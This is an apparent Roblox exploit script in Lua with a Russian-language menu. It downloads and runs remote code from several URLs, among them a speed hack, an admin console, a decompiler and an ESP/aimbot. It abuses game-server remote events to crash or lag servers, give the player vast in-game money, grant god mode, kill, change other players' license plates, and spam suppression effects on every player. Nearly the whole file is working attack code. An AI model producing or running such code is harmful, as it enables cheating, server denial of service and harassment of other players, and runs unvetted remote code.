local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/VladimirLuciver1/CustomHub/refs/heads/main/Library.lua"))()

local Window = Library.CreateLib("Revi Syka | V1.0","BloodTheme")

-------------------------------------------------------------------

local Skripts = Window:NewTab("Скрипты да?")
local SkriptsSection = Skripts:NewSection("Скрипты")

SkriptsSection:NewButton("Смена номеров", "крч есть шанс что ты сможешь сменить номера да?", function()
	for i,v in pairs(Player:GetPlayers()) do
		for i,car in pairs(v.Cars:GetChildren()) do
			ReplicatedStorage.ClientEvents.SmenaNomerovDonat:FireServer(car, "O000OO")
		end
	end
end)

SkriptsSection:NewButton("Большая скорость на тачке A-Chassis", "скрипт: Sanechekus", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Documantation12/Universal-Vehicle-Script/main/Main.lua'))()
end)

SkriptsSection:NewButton("Админка Infiniteyield", "скрипт: Sanechekus", function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

SkriptsSection:NewButton("Dex + decompiler", "чо писать", function()
	loadstring(game:HttpGet("https://github.com/OfficiallyMelon/BetterDecompiler/raw/main/dex_betterdecompiler.lua"))()
end)

SkriptsSection:NewButton("ESP + Aimbot", "чо писать", function()
	loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Universal%20ESP%20+%20Aimbot.txt"))()
end)

SkriptsSection:NewButton("Авто фарм Боровск Рыбалка", "чо писать", function()
	local Fishing = ReplicatedStorage.Remotes.Fishing
	local SellFish_upvr = Fishing.SellFish

	local function sellAllItems()
		for _, item in pairs(Player.Backpack:GetChildren()) do
			if item:IsA("Tool") and item.Name ~= "Удочка" then
				SellFish_upvr:FireServer("Sell", item.Name)
			end
		end
	end

	task.spawn(function()
		while task.wait(10) do
			sellAllItems()
		end
	end)

	local function onChildAdded(child)
		if child:IsA("Tool") then
			SellFish_upvr:FireServer("Sell", child.Name)
		end
	end

	Player.Backpack.ChildAdded:Connect(onChildAdded)

	while task.wait(.01) do
		local waterEffect = workspace:FindFirstChild("FishingWorkspace")
		local fishingGui = Player.PlayerGui:FindFirstChild("FishingGui")
		if fishingGui and fishingGui:FindFirstChild("CancelButton") then
			if not waterEffect or not waterEffect:FindFirstChild("Kruchok") then
				fishingGui.CancelButton.Visible = false
			elseif waterEffect.Kruchok:FindFirstChild("WaterEffect") then
				local effect = waterEffect.Kruchok.WaterEffect
				if effect.Enabled then
					fishingGui.CancelButton.Visible = true
				else
					fishingGui.CancelButton.Visible = false
				end
			end
		end
	end 
end)
-------------------------------------------------------------------
local ACS = Window:NewTab("ACS")
local ACSSection = ACS:NewSection("ACS 1.7.5")

ACSSection:NewButton("Поставить блок", "я не помню что за хуйня ну ок", function()
	local cFrame = CFrame.new(0,0,0)
	local Size = {
		X = 1,
		Y = 1,
		Z = 1
	}
	ReplicatedStorage['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=Player.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
end)

ACSSection:NewButton("Краш сервер", "клиент либо серверный хз", function()
	while task.wait() do
		for i = 1, 30 do
			ReplicatedStorage['ACS_Engine'].Eventos.ServerBullet:FireServer(Vector3.new(0/0/0),Vector3.new(0/0/0))
		end
	end
end)
ACSSection:NewButton("Дать себе денег (Cash) 999999999999", "если Cash находится в leaderstats", function()
	local zalupa = {
		ACS_Modulo = {
			Variaveis = {
				StoredAmmo = Player.leaderstats.Cash
			}
		}
	}
	ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(999999999999,zalupa)
end)
ACSSection:NewButton("Дать себе денег (RUB) 999999999999", "если RUB находится в leaderstats", function()
	local zalupa = {
		ACS_Modulo = {
			Variaveis = {
				StoredAmmo = Player.leaderstats.RUB
			}
		}
	}
	ReplicatedStorage.ACS_Engine.Eventos.Recarregar:FireServer(999999999999,zalupa)
end)

ACSSection:NewButton("GOD MODE", "хз не тестил", function()
	ReplicatedStorage['ACS_Engine'].Eventos.Damage:FireServer(Player.Character.Humanoid, -math.huge, 0, 0)
end)
ACSSection:NewButton("Вылечить себя", "хз не тестил", function()
	ReplicatedStorage['ACS_Engine'].Eventos.Damage:FireServer(Player.Character.Humanoid, -50, 0, 0)
end)
ACSSection:NewButton("Убить", "хз не тестил", function()
	ReplicatedStorage['ACS_Engine'].Eventos.Damage:FireServer(Player.Character.Humanoid, math.huge, 0, 0)
end)
ACSSection:NewButton("LAG SERVER", "хз не тестил", function()
	ReplicatedStorage['ACS_Engine'].Eventos.Breach:FireServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame={},Size={}})
end)
ACSSection:NewButton("SUPRESS SERVER", "хз не тестил", function()
	while task.wait() do
		for _, player in next, Players:GetPlayers() do
			ReplicatedStorage['ACS_Engine'].Eventos.Suppression:FireServer(player, 666, 666, 666)
		end
	end
end)
ACSSection:NewButton("VALUE CHANGER", "хз не тестил", function()
	local value = Player.Character.Saude.Variaveis.MLs
	ReplicatedStorage['ACS_Engine'].Eventos.Recarregar:FireServer(1,{ACS_Modulo={Variaveis={StoredAmmo = value}}})
end)
ACSSection:NewButton("WHIZZ", "имбуля", function()
	while task.wait() do
		for _, player in next, Players:GetPlayers() do
			ReplicatedStorage['ACS_Engine'].Eventos.Whizz:FireServer(player)
		end
	end
end)

local ACSSection1 = ACS:NewSection("ACS 2.0.1")

ACSSection1:NewButton("Поставить блок", "я не помню что за хуйня ну ок", function()
	local cFrame = CFrame.new(0,0,0)

	local Size = {
		X = 1,
		Y = 1,
		Z = 1
	}
	ReplicatedStorage['ACS_Engine'].Events.Breach:InvokeServer(3,{Fortified={},Destroyable=workspace},CFrame.new(),CFrame.new(),{CFrame=Player.Character.HumanoidRootPart.CFrame*cFrame,Size=Size})
end)
ACSSection1:NewButton("Краш сервер", "клиент либо серверный хз", function()
	while task.wait() do

		for _, player in next, Players:GetPlayers() do
			game:GetService("ReplicatedStorage")["ACS_Engine"].Events.Suppression:FireServer(player, 666, 666, 666)
		end
	end
end)
ACSSection1:NewButton("VALUE CHANGER", "хз не тестил Protecao.VestProtect.Value, 999", function()
	ReplicatedStorage['ACS_Engine'].Events.Refil:FireServer(Player['ACS_Client'].Protecao.VestProtect.Value, 999)
end)
ACSSection1:NewButton("WHIZZ", "все слышат звуки", function()
	while task.wait() do
		for _, player in next, Players:GetPlayers() do
			ReplicatedStorage['ACS_Engine'].Events.Whizz:FireServer(player)
		end
	end
end)
------------------------------------------------------------------------------
local More = Window:NewTab("Настройки")
local MoreSection = More:NewSection("Настройки")
MoreSection:NewKeybind("Toggle ui", "Бинд лол", Enum.KeyCode.Insert, function()
	Library:ToggleUI()
end)
